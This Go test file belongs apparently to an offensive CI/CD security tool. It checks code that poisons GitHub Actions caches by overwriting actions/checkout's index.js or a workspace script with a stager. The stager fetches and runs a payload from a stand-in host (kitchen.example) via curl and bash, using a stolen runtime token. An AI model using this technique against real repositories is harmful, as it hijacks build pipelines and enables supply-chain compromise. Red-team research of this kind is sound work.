// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package cachepoison

import (
	"archive/tar"
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/klauspost/compress/zstd"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestBuildOverlay_CheckoutPostUsesExactVictimRefs(t *testing.T) {
	overlay, refs, targets, err := buildOverlayWithCheckoutRoot("", DeploymentConfig{
		Candidate: VictimCandidate{
			Repository: "acme/release",
			Execution: ExecutionPlan{
				Kind: ExecutionKindCheckoutPost,
				Checkouts: []CheckoutTarget{
					{Uses: "actions/checkout@v6", Ref: "v6"},
					{Uses: "actions/checkout@deadbeef", Ref: "deadbeef"},
				},
			},
		},
		VictimStagerURL:  "https://kitchen.example/r/cb-123",
		VictimCallbackID: "cb-123",
	}, t.TempDir())
	require.NoError(t, err)
	assert.Equal(t, []string{"deadbeef", "v6"}, refs)
	assert.Nil(t, targets)
	_, hasV6 := overlay["/home/runner/work/_actions/actions/checkout/v6/dist/index.js"]
	_, hasSHA := overlay["/home/runner/work/_actions/actions/checkout/deadbeef/dist/index.js"]
	_, hasV4 := overlay["/home/runner/work/_actions/actions/checkout/v4/dist/index.js"]
	_, hasUtility := overlay["/home/runner/work/_actions/actions/checkout/v6/dist/utility.js"]
	assert.True(t, hasV6)
	assert.True(t, hasSHA)
	assert.False(t, hasV4)
	assert.True(t, hasUtility)
}

func TestBuildOverlay_CheckoutPostMergesDiscoveredLocalRefs(t *testing.T) {
	checkoutRoot := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(checkoutRoot, "v4"), 0o755))

	overlay, refs, targets, err := buildOverlayWithCheckoutRoot("", DeploymentConfig{
		Candidate: VictimCandidate{
			Repository: "acme/release",
			Execution: ExecutionPlan{
				Kind: ExecutionKindCheckoutPost,
				Checkouts: []CheckoutTarget{
					{Uses: "actions/checkout@deadbeef", Ref: "deadbeef"},
				},
			},
		},
		VictimStagerURL:  "https://kitchen.example/r/cb-123",
		VictimCallbackID: "cb-123",
	}, checkoutRoot)
	require.NoError(t, err)
	assert.Equal(t, []string{"deadbeef", "v4"}, refs)
	assert.Nil(t, targets)
	_, hasSHA := overlay["/home/runner/work/_actions/actions/checkout/deadbeef/dist/index.js"]
	_, hasV4 := overlay["/home/runner/work/_actions/actions/checkout/v4/dist/index.js"]
	assert.True(t, hasSHA)
	assert.True(t, hasV4)
}

func TestBuildOverlay_CheckoutPostUsesCurlStagerFetch(t *testing.T) {
	overlay, _, _, err := buildOverlay("", DeploymentConfig{
		Candidate: VictimCandidate{
			Repository: "acme/release",
			Execution: ExecutionPlan{
				Kind: ExecutionKindCheckoutPost,
				Checkouts: []CheckoutTarget{
					{Uses: "actions/checkout@v4", Ref: "v4"},
				},
			},
		},
		VictimStagerURL:  "https://kitchen.example/r/cb-123",
		VictimCallbackID: "cb-123",
	})
	require.NoError(t, err)

	index, ok := overlay["/home/runner/work/_actions/actions/checkout/v4/dist/index.js"]
	require.True(t, ok)
	utility, ok := overlay["/home/runner/work/_actions/actions/checkout/v4/dist/utility.js"]
	require.True(t, ok)
	assert.Contains(t, string(index.Content), "curl -fsSL")
	assert.Contains(t, string(index.Content), "mktemp")
	assert.Contains(t, string(index.Content), "/bin/bash")
	assert.Contains(t, string(index.Content), "https://kitchen.example/r/cb-123")
	assert.Contains(t, string(index.Content), "cb-123")
	assert.Equal(t, string(index.Content), string(utility.Content))
}

func TestBuildDirectExecutionScript_QuotesStagerURLForShell(t *testing.T) {
	stagerURL := `https://kitchen.example/r/cb'foo?x="$PATH"&y=semi;colon`
	script := buildDirectExecutionScript(stagerURL, "cb-123")

	var assignment string
	for _, line := range strings.Split(script, "\n") {
		if strings.HasPrefix(line, "SMOKEDMEAT_STAGER_URL=") {
			assignment = line
			break
		}
	}
	require.NotEmpty(t, assignment)

	cmd := exec.Command("bash", "-lc", assignment+"\nprintf '%s' \"$SMOKEDMEAT_STAGER_URL\"")
	out, err := cmd.Output()
	require.NoError(t, err)
	assert.Equal(t, stagerURL, string(out))
}

func TestBuildOverlay_DirectCacheExecTargetsWorkspacePath(t *testing.T) {
	t.Setenv("GITHUB_WORKSPACE", "/home/runner/work/demo/demo")

	overlay, refs, targets, err := buildOverlay("", DeploymentConfig{
		Candidate: VictimCandidate{
			Repository: "acme/demo",
			Execution: ExecutionPlan{
				Kind:       ExecutionKindDirectCache,
				TargetPath: "build-cache/setup.sh",
			},
		},
		VictimStagerURL:  "https://kitchen.example/r/cb-456",
		VictimCallbackID: "cb-456",
	})
	require.NoError(t, err)
	assert.Nil(t, refs)
	assert.Equal(t, []string{"/home/runner/work/demo/demo/build-cache/setup.sh"}, targets)

	file, ok := overlay["/home/runner/work/demo/demo/build-cache/setup.sh"]
	require.True(t, ok)
	assert.EqualValues(t, 0o755, file.Mode)
	assert.Contains(t, string(file.Content), "https://kitchen.example/r/cb-456")
	assert.Contains(t, string(file.Content), "cb-456")
}

func TestPoison_ActionsCacheDirectExec_V2(t *testing.T) {
	root := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(root, "build-cache"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(root, "build-cache", "seed.txt"), []byte("seed"), 0o644))

	var uploadedArchive []byte
	var sawLookup bool
	var sawCreate bool
	var sawFinalize bool

	mux := http.NewServeMux()
	var srv runtimeTestServer
	mux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL", func(w http.ResponseWriter, r *http.Request) {
		sawLookup = true
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false})
	})
	mux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry", func(w http.ResponseWriter, r *http.Request) {
		sawCreate = true
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{
			"ok":                true,
			"signed_upload_url": srv.HostURL("/upload/new-cache"),
		})
	})
	mux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload", func(w http.ResponseWriter, r *http.Request) {
		sawFinalize = true
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "entry_id": "1"})
	})
	mux.HandleFunc("/upload/new-cache", func(w http.ResponseWriter, r *http.Request) {
		assert.Empty(t, r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPut, r.Method)
		body, err := io.ReadAll(r.Body)
		require.NoError(t, err)
		uploadedArchive = append([]byte(nil), body...)
		w.WriteHeader(http.StatusCreated)
	})

	srv = newRuntimeTestServer(mux)
	defer srv.Close()

	t.Setenv("GITHUB_WORKSPACE", root)
	t.Setenv("ACTIONS_RESULTS_URL", srv.URL)
	t.Setenv("ACTIONS_RUNTIME_TOKEN", "runtime-token")

	result, err := Poison(context.Background(), DeploymentConfig{
		Candidate: VictimCandidate{
			Repository: "acme/demo",
			CacheEntry: CacheEntryPlan{
				Mode:         CacheEntryModePredicted,
				Strategy:     StrategyActionsCache,
				KeyTemplate:  "demo-key",
				PathPatterns: []string{"./build-cache"},
			},
			Execution: ExecutionPlan{
				Kind:       ExecutionKindDirectCache,
				TargetPath: "build-cache/setup.sh",
			},
		},
		VictimStagerURL:  "https://kitchen.example/r/cb-789",
		VictimCallbackID: "cb-789",
	})
	require.NoError(t, err)
	assert.True(t, sawLookup)
	assert.True(t, sawCreate)
	assert.True(t, sawFinalize)
	assert.Equal(t, "demo-key", result.Key)
	require.Len(t, result.TargetPaths, 1)
	assert.Equal(t, filepath.ToSlash(filepath.Join(root, "build-cache", "setup.sh")), result.TargetPaths[0])
	require.NotEmpty(t, uploadedArchive)

	files := extractArchiveEntries(t, uploadedArchive)
	script := files[result.TargetPaths[0]]
	assert.Contains(t, string(script), "https://kitchen.example/r/cb-789")
	assert.Contains(t, string(script), "cb-789")
}

func TestPoisonWithRuntime_ActionsCacheDirectExec_V2(t *testing.T) {
	root := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(root, "build-cache"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(root, "build-cache", "seed.txt"), []byte("seed"), 0o644))

	var uploadedArchive []byte
	var sawLookup bool
	var sawCreate bool
	var sawFinalize bool

	mux := http.NewServeMux()
	var srv runtimeTestServer
	mux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL", func(w http.ResponseWriter, r *http.Request) {
		sawLookup = true
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": false})
	})
	mux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry", func(w http.ResponseWriter, r *http.Request) {
		sawCreate = true
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{
			"ok":                true,
			"signed_upload_url": srv.HostURL("/upload/new-cache"),
		})
	})
	mux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload", func(w http.ResponseWriter, r *http.Request) {
		sawFinalize = true
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{"ok": true, "entry_id": "1"})
	})
	mux.HandleFunc("/upload/new-cache", func(w http.ResponseWriter, r *http.Request) {
		assert.Empty(t, r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPut, r.Method)
		body, err := io.ReadAll(r.Body)
		require.NoError(t, err)
		uploadedArchive = append([]byte(nil), body...)
		w.WriteHeader(http.StatusCreated)
	})

	srv = newRuntimeTestServer(mux)
	defer srv.Close()

	t.Setenv("GITHUB_WORKSPACE", root)

	result, err := PoisonWithRuntime(context.Background(), DeploymentConfig{
		Candidate: VictimCandidate{
			Repository: "acme/demo",
			CacheEntry: CacheEntryPlan{
				Mode:         CacheEntryModePredicted,
				Strategy:     StrategyActionsCache,
				KeyTemplate:  "demo-key-explicit-runtime",
				PathPatterns: []string{"./build-cache"},
			},
			Execution: ExecutionPlan{
				Kind:       ExecutionKindDirectCache,
				TargetPath: "build-cache/setup.sh",
			},
		},
		VictimStagerURL:  "https://kitchen.example/r/cb-explicit",
		VictimCallbackID: "cb-explicit",
	}, RuntimeEnvironment{
		RuntimeToken:   "runtime-token",
		ResultsURL:     srv.URL,
		CacheServiceV2: true,
	})
	require.NoError(t, err)
	assert.True(t, sawLookup)
	assert.True(t, sawCreate)
	assert.True(t, sawFinalize)
	assert.Equal(t, "demo-key-explicit-runtime", result.Key)
	require.Len(t, result.TargetPaths, 1)
	assert.Equal(t, filepath.ToSlash(filepath.Join(root, "build-cache", "setup.sh")), result.TargetPaths[0])
	require.NotEmpty(t, uploadedArchive)
}

func TestBuildArchive_AbsolutePathsRestoreWithSystemTar(t *testing.T) {
	root, err := os.MkdirTemp("/tmp", "smokedmeat-cache-abs-*")
	require.NoError(t, err)
	t.Cleanup(func() {
		_ = os.RemoveAll(root)
	})
	targetPath := filepath.Join(root, "runner", "work", "_actions", "actions", "checkout", "v4", "dist", "index.js")
	require.NoError(t, os.MkdirAll(filepath.Dir(targetPath), 0o755))

	data := buildCompressedArchive(t, map[string]OverlayFile{
		filepath.ToSlash(targetPath): {
			Content: []byte("payload"),
			Mode:    0o644,
		},
	})

	archivePath := filepath.Join(root, "cache.tzst")
	require.NoError(t, os.WriteFile(archivePath, data, 0o644))

	cmd := exec.Command("tar", "-xf", archivePath, "-P", "-C", root, "--use-compress-program", "unzstd")
	output, err := cmd.CombinedOutput()
	require.NoError(t, err, string(output))

	content, err := os.ReadFile(targetPath)
	require.NoError(t, err)
	assert.Equal(t, "payload", string(content))
}

func TestPoison_ActionsCacheDirectExec_V2WithBaseArchive(t *testing.T) {
	root := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Join(root, "build-cache"), 0o755))

	baseArchive := buildCompressedArchive(t, map[string]OverlayFile{
		filepath.ToSlash(filepath.Join(root, "build-cache", "seed.sh")): {
			Content: []byte("#!/bin/bash\necho seed\n"),
			Mode:    0o755,
		},
	})

	var sawLookup bool
	var sawCreate bool
	var sawFinalize bool
	var uploadedArchive []byte
	var srv runtimeTestServer
	var cacheVersion string

	mux := http.NewServeMux()
	mux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL", func(w http.ResponseWriter, r *http.Request) {
		sawLookup = true
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)

		var body map[string]any
		require.NoError(t, json.NewDecoder(r.Body).Decode(&body))
		assert.Equal(t, "demo-key-v2", body["key"])
		assert.Equal(t, []any{}, body["restore_keys"])
		version, ok := body["version"].(string)
		require.True(t, ok)
		assert.NotEmpty(t, version)
		cacheVersion = version

		_ = json.NewEncoder(w).Encode(map[string]any{
			"ok":                  true,
			"signed_download_url": srv.HostURL("/download/base-cache"),
		})
	})
	mux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry", func(w http.ResponseWriter, r *http.Request) {
		sawCreate = true
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)

		var body map[string]any
		require.NoError(t, json.NewDecoder(r.Body).Decode(&body))
		assert.Equal(t, "demo-key-v2", body["key"])
		assert.Equal(t, cacheVersion, body["version"])

		_ = json.NewEncoder(w).Encode(map[string]any{
			"ok":                true,
			"signed_upload_url": srv.HostURL("/upload/new-cache"),
		})
	})
	mux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload", func(w http.ResponseWriter, r *http.Request) {
		sawFinalize = true
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)

		var body map[string]any
		require.NoError(t, json.NewDecoder(r.Body).Decode(&body))
		assert.Equal(t, "demo-key-v2", body["key"])
		assert.Equal(t, cacheVersion, body["version"])
		assert.NotEmpty(t, body["size_bytes"])

		_ = json.NewEncoder(w).Encode(map[string]any{
			"ok":       true,
			"entry_id": "entry-1",
		})
	})
	mux.HandleFunc("/download/base-cache", func(w http.ResponseWriter, r *http.Request) {
		assert.Empty(t, r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodGet, r.Method)
		w.Header().Set("Content-Type", "application/octet-stream")
		_, err := w.Write(baseArchive)
		require.NoError(t, err)
	})
	mux.HandleFunc("/upload/new-cache", func(w http.ResponseWriter, r *http.Request) {
		assert.Empty(t, r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPut, r.Method)
		assert.Equal(t, "application/octet-stream", r.Header.Get("Content-Type"))
		assert.Equal(t, "BlockBlob", r.Header.Get("x-ms-blob-type"))

		body, err := io.ReadAll(r.Body)
		require.NoError(t, err)
		uploadedArchive = append([]byte(nil), body...)
		w.WriteHeader(http.StatusCreated)
	})

	srv = newRuntimeTestServer(mux)
	defer srv.Close()

	t.Setenv("GITHUB_WORKSPACE", root)
	t.Setenv("ACTIONS_RESULTS_URL", srv.URL)
	t.Setenv("ACTIONS_CACHE_SERVICE_V2", "1")
	t.Setenv("ACTIONS_RUNTIME_TOKEN", "runtime-token")

	result, err := Poison(context.Background(), DeploymentConfig{
		Candidate: VictimCandidate{
			Repository: "acme/demo",
			CacheEntry: CacheEntryPlan{
				Mode:        CacheEntryModePredicted,
				Strategy:    StrategyActionsCache,
				KeyTemplate: "demo-key-v2",
				PathPatterns: []string{
					"./build-cache",
				},
			},
			Execution: ExecutionPlan{
				Kind:       ExecutionKindDirectCache,
				TargetPath: "build-cache/setup.sh",
			},
		},
		VictimStagerURL:  "https://kitchen.example/r/cb-v2",
		VictimCallbackID: "cb-v2",
	})
	require.NoError(t, err)
	assert.True(t, sawLookup)
	assert.True(t, sawCreate)
	assert.True(t, sawFinalize)
	assert.True(t, result.HadBaseEntry)
	require.NotEmpty(t, uploadedArchive)

	files := extractArchiveEntries(t, uploadedArchive)
	assert.Contains(t, files, filepath.ToSlash(filepath.Join(root, "build-cache", "seed.sh")))
	assert.Contains(t, files, result.TargetPaths[0])
	assert.Contains(t, string(files[result.TargetPaths[0]]), "https://kitchen.example/r/cb-v2")
	assert.Contains(t, string(files[result.TargetPaths[0]]), "cb-v2")
}

func TestLookupDownloadURL_V2CacheMiss(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL", func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{
			"ok":                  false,
			"signed_download_url": "",
		})
	})

	srv := newRuntimeTestServer(mux)
	defer srv.Close()

	t.Setenv("ACTIONS_RESULTS_URL", srv.URL)
	t.Setenv("ACTIONS_CACHE_SERVICE_V2", "1")
	t.Setenv("ACTIONS_RUNTIME_TOKEN", "runtime-token")

	downloadURL, err := lookupDownloadURL(context.Background(), RuntimeEnvironment{
		RuntimeToken:   "runtime-token",
		ResultsURL:     srv.URL,
		CacheServiceV2: true,
	}, srv.URL+"/", "demo-key-v2", "cache-version-v2")
	require.NoError(t, err)
	assert.Empty(t, downloadURL)
}

func TestCreateCacheEntryV2_ErrorMessage(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry", func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{
			"ok":      false,
			"message": "cache entry already exists",
		})
	})

	srv := newRuntimeTestServer(mux)
	defer srv.Close()

	t.Setenv("ACTIONS_RESULTS_URL", srv.URL)
	t.Setenv("ACTIONS_CACHE_SERVICE_V2", "1")
	t.Setenv("ACTIONS_RUNTIME_TOKEN", "runtime-token")

	uploadURL, err := createCacheEntryV2(context.Background(), RuntimeEnvironment{
		RuntimeToken:   "runtime-token",
		ResultsURL:     srv.URL,
		CacheServiceV2: true,
	}, srv.URL+"/", "demo-key-v2", "cache-version-v2")
	require.Error(t, err)
	assert.Empty(t, uploadURL)
	assert.Contains(t, err.Error(), "cache entry already exists")
}

func TestFinalizeCacheEntryV2_DefaultFailureMessage(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload", func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, "Bearer runtime-token", r.Header.Get("Authorization"))
		assert.Equal(t, http.MethodPost, r.Method)
		_ = json.NewEncoder(w).Encode(map[string]any{
			"ok": false,
		})
	})

	srv := newRuntimeTestServer(mux)
	defer srv.Close()

	t.Setenv("ACTIONS_RESULTS_URL", srv.URL)
	t.Setenv("ACTIONS_CACHE_SERVICE_V2", "1")
	t.Setenv("ACTIONS_RUNTIME_TOKEN", "runtime-token")

	err := finalizeCacheEntryV2(context.Background(), RuntimeEnvironment{
		RuntimeToken:   "runtime-token",
		ResultsURL:     srv.URL,
		CacheServiceV2: true,
	}, srv.URL+"/", "demo-key-v2", "cache-version-v2", 42)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "cache finalize failed")
}

func TestDownloadSignedURL_HTTPError(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/download/fail", func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, http.MethodGet, r.Method)
		http.Error(w, "boom", http.StatusBadGateway)
	})

	srv := newRuntimeTestServer(mux)
	defer srv.Close()

	targetPath := filepath.Join(t.TempDir(), "cache.tzst")
	err := downloadSignedURL(context.Background(), srv.HostURL("/download/fail"), targetPath)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "signed cache download failed with status 502")
	assert.Contains(t, err.Error(), "boom")
}

func TestCreateCacheEntryV2_UsesHTTPClientTimeout(t *testing.T) {
	prevClient := cacheHTTPClient
	cacheHTTPClient = &http.Client{Timeout: 20 * time.Millisecond}
	t.Cleanup(func() {
		cacheHTTPClient = prevClient
	})

	mux := http.NewServeMux()
	mux.HandleFunc("/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry", func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(100 * time.Millisecond)
		_ = json.NewEncoder(w).Encode(map[string]any{
			"ok":                true,
			"signed_upload_url": "https://blob.example/upload",
		})
	})

	srv := newRuntimeTestServer(mux)
	defer srv.Close()

	t.Setenv("ACTIONS_RESULTS_URL", srv.URL)
	t.Setenv("ACTIONS_CACHE_SERVICE_V2", "1")
	t.Setenv("ACTIONS_RUNTIME_TOKEN", "runtime-token")

	_, err := createCacheEntryV2(context.Background(), RuntimeEnvironment{
		RuntimeToken:   "runtime-token",
		ResultsURL:     srv.URL,
		CacheServiceV2: true,
	}, srv.URL+"/", "demo-key-v2", "cache-version-v2")
	require.Error(t, err)
	assert.Contains(t, err.Error(), "Client.Timeout")
}

func TestDownloadSignedURL_RejectsOversizedContentLength(t *testing.T) {
	prevLimit := maxSignedCacheDownloadSize
	maxSignedCacheDownloadSize = 8
	t.Cleanup(func() {
		maxSignedCacheDownloadSize = prevLimit
	})

	mux := http.NewServeMux()
	mux.HandleFunc("/download/oversized", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Length", "16")
		w.WriteHeader(http.StatusOK)
	})

	srv := newRuntimeTestServer(mux)
	defer srv.Close()

	targetPath := filepath.Join(t.TempDir(), "cache.tzst")
	err := downloadSignedURL(context.Background(), srv.HostURL("/download/oversized"), targetPath)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "signed cache download exceeds limit")
	_, statErr := os.Stat(targetPath)
	assert.ErrorIs(t, statErr, os.ErrNotExist)
}

func TestRuntimeEnvironment_DefaultsToV2(t *testing.T) {
	t.Setenv("ACTIONS_RUNTIME_TOKEN", "runtime-token")
	t.Setenv("ACTIONS_RESULTS_URL", "https://results.actions.example/_apis/results")
	t.Setenv("ACTIONS_CACHE_URL", "https://cache.actions.example/_apis/artifactcache")
	t.Setenv("ACTIONS_CACHE_SERVICE_V2", "")

	runtimeEnv := RuntimeEnvironment{}.withEnvFallback()
	assert.True(t, runtimeEnv.CacheServiceV2)
	assert.True(t, runtimeEnv.Complete())
	assert.Equal(t, "v2", cacheServiceVersion(runtimeEnv))

	merged := RuntimeEnvironment{}.Merge(RuntimeEnvironment{
		RuntimeToken: "runtime-token",
		ResultsURL:   "https://results.actions.example/_apis/results",
		CacheURL:     "https://cache.actions.example/_apis/artifactcache",
	})
	assert.True(t, merged.CacheServiceV2)
}

func TestDownloadSignedURL_RejectsOversizedStreamWithoutContentLength(t *testing.T) {
	prevLimit := maxSignedCacheDownloadSize
	maxSignedCacheDownloadSize = 8
	t.Cleanup(func() {
		maxSignedCacheDownloadSize = prevLimit
	})

	mux := http.NewServeMux()
	mux.HandleFunc("/download/chunked", func(w http.ResponseWriter, r *http.Request) {
		flusher, ok := w.(http.Flusher)
		require.True(t, ok)
		flusher.Flush()
		_, err := w.Write([]byte("way-too-large"))
		require.NoError(t, err)
	})

	srv := newRuntimeTestServer(mux)
	defer srv.Close()

	targetPath := filepath.Join(t.TempDir(), "cache.tzst")
	err := downloadSignedURL(context.Background(), srv.HostURL("/download/chunked"), targetPath)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "signed cache download exceeds limit")
	_, statErr := os.Stat(targetPath)
	assert.ErrorIs(t, statErr, os.ErrNotExist)
}

func TestUploadSignedURL_HTTPError(t *testing.T) {
	archivePath := filepath.Join(t.TempDir(), "cache.tzst")
	require.NoError(t, os.WriteFile(archivePath, []byte("archive"), 0o644))

	mux := http.NewServeMux()
	mux.HandleFunc("/upload/fail", func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, http.MethodPut, r.Method)
		assert.Equal(t, "application/octet-stream", r.Header.Get("Content-Type"))
		assert.Equal(t, "BlockBlob", r.Header.Get("x-ms-blob-type"))
		http.Error(w, "denied", http.StatusForbidden)
	})

	srv := newRuntimeTestServer(mux)
	defer srv.Close()

	err := uploadSignedURL(context.Background(), srv.HostURL("/upload/fail"), archivePath)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "signed cache upload failed with status 403")
	assert.Contains(t, err.Error(), "denied")
}

func TestBuildCheckoutIndexJS_EmbedsExecOnceMarkerAndCallbackID(t *testing.T) {
	content := buildCheckoutIndexJS("https://kitchen.example/r/cb-999", "cb-999")
	assert.Contains(t, content, "https://kitchen.example/r/cb-999")
	assert.Contains(t, content, "cb-999")
	assert.Contains(t, content, ".smokedmeat-exec-once-")
	assert.Contains(t, content, "fs.openSync(markerPath, 'wx'")
}

func TestDiscoverCheckoutRefsIfPresent_ReturnsActualDirsOnly(t *testing.T) {
	root := t.TempDir()
	require.NoError(t, os.Mkdir(filepath.Join(root, "v4"), 0o755))
	require.NoError(t, os.Mkdir(filepath.Join(root, "deadbeef"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(root, "README.txt"), []byte("x"), 0o644))

	assert.Equal(t, []string{"deadbeef", "v4"}, discoverCheckoutRefsIfPresent(root))
}

type runtimeTestServer struct {
	*httptest.Server
}

func newRuntimeTestServer(handler http.Handler) runtimeTestServer {
	server := httptest.NewServer(handler)
	return runtimeTestServer{Server: server}
}

func (s runtimeTestServer) HostURL(p string) string {
	return s.URL + p
}

func buildCompressedArchive(t *testing.T, overlay map[string]OverlayFile) []byte {
	t.Helper()

	var buf bytes.Buffer
	zw, err := zstd.NewWriter(&buf)
	require.NoError(t, err)

	tw := tar.NewWriter(zw)
	require.NoError(t, appendOverlay(tw, overlay))
	require.NoError(t, tw.Close())
	require.NoError(t, zw.Close())
	return buf.Bytes()
}

func extractArchiveEntries(t *testing.T, data []byte) map[string][]byte {
	t.Helper()

	reader, err := zstd.NewReader(bytes.NewReader(data))
	require.NoError(t, err)
	defer reader.Close()

	tr := tar.NewReader(reader)
	files := make(map[string][]byte)
	for {
		header, err := tr.Next()
		if err == io.EOF {
			break
		}
		require.NoError(t, err)
		if !header.FileInfo().Mode().IsRegular() {
			continue
		}
		body, err := io.ReadAll(tr)
		require.NoError(t, err)
		files[header.Name] = body
	}
	return files
}
